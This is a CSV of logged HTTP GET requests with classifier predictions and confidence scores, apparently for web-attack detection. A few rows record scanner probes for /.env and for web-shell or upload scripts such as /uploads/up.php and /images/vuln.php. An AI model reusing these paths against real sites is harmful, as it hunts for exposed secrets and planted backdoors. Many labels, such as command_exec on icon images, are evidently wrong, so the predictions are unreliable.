row_idx,text,pred_label,max_prob
0,METHOD=GET PATH=/Datasets%20Description/Network/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5432575941085815
1,METHOD=GET PATH=/Datasets%20Description/Network/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5611499547958374
2,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
3,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
4,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
5,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
6,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
7,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
8,METHOD=GET PATH=/Datasets%20Description/PE_malware/OPCleaver.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5422806739807129
9,METHOD=GET PATH=/self.logs/access.log.2017-03-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44173333048820496
10,METHOD=GET PATH=/Datasets%20Description/Network/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5613512396812439
11,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
12,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
13,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
14,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
15,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
16,METHOD=GET PATH=/Datasets%20Description/Network/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5772854089736938
17,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.5968502163887024
18,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
19,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
20,METHOD=GET PATH=/Datasets%20Description/Network/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5891454815864563
21,METHOD=GET PATH=/self.logs/access.log.2019-04-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46034368872642517
22,METHOD=GET PATH=/self.logs/access.log.2019-11-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.48246458172798157
23,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
24,METHOD=GET PATH=/self.logs/error.log.2017-10-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4008166491985321
25,METHOD=GET PATH=/self.logs/error.log.2020-05-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4031117260456085
26,METHOD=GET PATH=/self.logs/access.log.2020-01-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.446196585893631
27,METHOD=GET PATH=/Datasets%20Description/Network/tunnel.html QUERY= PROTOCOL=HTTP/1.1,benign,0.550652801990509
28,METHOD=GET PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.654232382774353
29,METHOD=GET PATH=/self.logs/error.log.2020-06-20 QUERY= PROTOCOL=HTTP/1.1,benign,0.4965709149837494
30,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
31,METHOD=GET PATH=/self.logs/access.log.2021-03-10.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4461417496204376
32,METHOD=GET PATH=/self.logs/error.log.2017-02-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4208315312862396
33,METHOD=GET PATH=/self.logs/error.log.2020-11-21 QUERY= PROTOCOL=HTTP/1.1,benign,0.491682231426239
34,METHOD=GET PATH=/self.logs/access.log.2018-05-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.453999400138855
35,METHOD=GET PATH=/self.logs/error.log.2020-06-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41990336775779724
36,METHOD=GET PATH=/self.logs/access.log.2021-03-19.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4530445337295532
37,METHOD=GET PATH=/self.logs/access.log.2020-05-15.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4641561210155487
38,METHOD=GET PATH=/self.logs/error.log.2019-04-29.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4336912930011749
39,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
40,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
41,METHOD=GET PATH=/self.logs/access.log.2020-10-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44934701919555664
42,METHOD=GET PATH=/self.logs/error.log.2017-10-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4271652400493622
43,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
44,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
45,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
46,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
47,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
48,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
49,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
50,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
51,METHOD=GET PATH=/self.logs/error.log.2020-03-23 QUERY= PROTOCOL=HTTP/1.1,benign,0.4819962680339813
52,METHOD=GET PATH=/self.logs/access.log.2017-11-05.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4753624498844147
53,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
54,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
55,METHOD=GET PATH=/%C2%A0%C2%A0 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46687576174736023
56,METHOD=GET PATH=/%C3%82%C2%A0%C3%82 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.361696720123291
57,METHOD=GET PATH=/honeypot//%22http://amunhoney.sourceforge.net//%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.42035993933677673
58,METHOD=GET PATH=/honeypot//%22http://glastopf.org//%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.4343529939651489
59,METHOD=GET PATH=/honeypot//%22http://www.maxmind.com/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5336403250694275
60,METHOD=GET PATH=/honeypot//%22https://twitter.com/sooshie/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5295597910881042
61,METHOD=GET PATH=/honeypot//%22https://twitter.com/theroxyd/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5299971699714661
62,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
63,METHOD=GET PATH=/%C2%A0 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47530853748321533
64,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
65,METHOD=GET PATH=/self.logs/access.log.2020-06-02.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4481620192527771
66,METHOD=GET PATH=/self.logs/access.log.2018-05-07.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.467984139919281
67,METHOD=GET PATH=/self.logs/access.log.2017-01-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45595598220825195
68,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
69,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
70,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
71,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
72,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
73,METHOD=GET PATH=/self.logs/access.log.2020-11-20.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4740222692489624
74,METHOD=GET PATH=/self.logs/error.log.2020-10-01 QUERY= PROTOCOL=HTTP/1.1,benign,0.5044580101966858
75,METHOD=GET PATH=/self.logs/access.log.2021-06-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4590235650539398
76,METHOD=GET PATH=/self.logs/error.log.2019-05-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41845908761024475
77,METHOD=GET PATH=/self.logs/access.log.2020-12-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47734060883522034
78,METHOD=GET PATH=/self.logs/error.log.2021-06-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42460423707962036
79,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
80,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
81,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
82,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
83,METHOD=GET PATH=/self.logs/access.log.2019-12-29.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4717639684677124
84,METHOD=GET PATH=/self.logs/error.log.2020-11-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4105055034160614
85,METHOD=GET PATH=/self.logs/error.log.2017-07-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4047729969024658
86,METHOD=GET PATH=/self.logs/access.log.2018-03-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45636746287345886
87,METHOD=GET PATH=/self.logs/access.log.2020-01-12.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4696837365627289
88,METHOD=GET PATH=/self.logs/access.log.2019-01-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4617648720741272
89,METHOD=GET PATH=/self.logs/error.log.2017-07-10.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4233303666114807
90,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
91,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
92,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
93,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
94,METHOD=GET PATH=/self.logs/error.log.2019-12-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41245225071907043
95,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
96,METHOD=GET PATH=/self.logs/access.log.2020-02-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44406658411026
97,METHOD=GET PATH=/self.logs/access.log.2018-06-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44656065106391907
98,METHOD=GET PATH=/self.logs/access.log.2017-10-01.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47216519713401794
99,METHOD=GET PATH=/self.logs/error.log.2020-02-13.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057396948337555
100,METHOD=GET PATH=/self.logs/error.log.2018-03-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4141730070114136
101,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
102,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
103,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
104,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
105,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
106,METHOD=GET PATH=/self.logs/access.log.2018-02-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4508277475833893
107,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
108,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6321981549263
109,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
110,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
111,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
112,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
113,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
114,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
115,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
116,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
117,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
118,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
119,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
120,METHOD=GET PATH=/self.logs/access.log.2017-03-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44173333048820496
121,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
122,METHOD=GET PATH=/self.logs/access.log.2021-09-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4532565772533417
123,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
124,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
125,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
126,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711091041565
127,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874844551086426
128,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
129,METHOD=GET PATH=/tg/a.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.8342914581298828
130,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
131,METHOD=GET PATH=/self.logs/access.log.2017-09-15.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46399638056755066
132,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
133,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
134,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
135,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
136,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
137,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
138,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
139,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
140,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
141,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
142,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
143,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
144,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
145,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
146,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
147,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
148,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
149,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
150,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
151,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
152,METHOD=GET PATH=/ads.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41103294491767883
153,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
154,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
155,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
156,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
157,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
158,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
159,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
160,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
161,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
162,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1 QUERY= PROTOCOL=HTTP/1.1,benign,0.6136957406997681
163,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5956102609634399
164,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2 QUERY= PROTOCOL=HTTP/1.1,benign,0.6024762392044067
165,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5899902582168579
166,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3 QUERY= PROTOCOL=HTTP/1.1,benign,0.587634265422821
167,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5773578882217407
168,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
169,METHOD=GET PATH=/Datasets%20Description/Network/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5613512396812439
170,METHOD=GET PATH=/Datasets%20Description/Network/files.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5314313173294067
171,METHOD=GET PATH=/Datasets%20Description/Network/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5432575941085815
172,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
173,METHOD=GET PATH=/Datasets%20Description/Network/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5891454815864563
174,METHOD=GET PATH=/Datasets%20Description/Network/signatures.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5780556201934814
175,METHOD=GET PATH=/Datasets%20Description/Network/smtp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5483987331390381
176,METHOD=GET PATH=/Datasets%20Description/Network/ssh.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5835829377174377
177,METHOD=GET PATH=/Datasets%20Description/Network/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5611499547958374
178,METHOD=GET PATH=/Datasets%20Description/Network/tunnel.html QUERY= PROTOCOL=HTTP/1.1,benign,0.550652801990509
179,METHOD=GET PATH=/Datasets%20Description/Network/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5772854089736938
180,METHOD=GET PATH=/Datasets%20Description/PE_malware/OPCleaver.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5422806739807129
181,METHOD=GET PATH=/Datasets%20Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5646774172782898
182,METHOD=GET PATH=/Datasets%20Description/PE_malware/Zeus.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5371832251548767
183,METHOD=GET PATH=/data QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5001644492149353
184,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
185,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
186,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
187,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
188,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
189,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
190,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
191,METHOD=GET PATH=/self.logs/access.log.2019-10-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4570903480052948
192,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
193,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
194,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
195,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
196,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
197,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
198,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
199,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
200,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
201,METHOD=GET PATH=/self.logs/error.log.2019-01-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4206598103046417
202,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
203,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
204,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
205,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
206,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
207,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
208,METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.8424050211906433
209,METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1,command_exec,0.5479199290275574
210,METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44586658477783203
211,METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.623659074306488
212,METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.6996337175369263
213,METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.8007306456565857
214,METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.7803764939308167
215,METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5428050756454468
216,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
217,METHOD=GET PATH=/self.logs/access.log.2018-01-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44583991169929504
218,METHOD=GET PATH=/ads.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41103294491767883
219,METHOD=GET PATH=/honeypot/bsidesdfw%20-%202014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign,0.39535993337631226
220,METHOD=GET PATH=/self.logs/access.log.2021-04-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45773324370384216
221,METHOD=GET PATH=/self.logs/error.log.2018-04-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.43003448843955994
222,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
223,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
224,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
225,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
226,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
227,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
228,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
229,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
230,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
231,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
232,METHOD=GET PATH=/domaindata/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7230401635169983
233,METHOD=GET PATH=/apple-touch-icon.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.37689048051834106
234,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
235,METHOD=GET PATH=/apple-touch-icon.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.37689048051834106
236,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
237,METHOD=GET PATH=/domainmovement.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7431632280349731
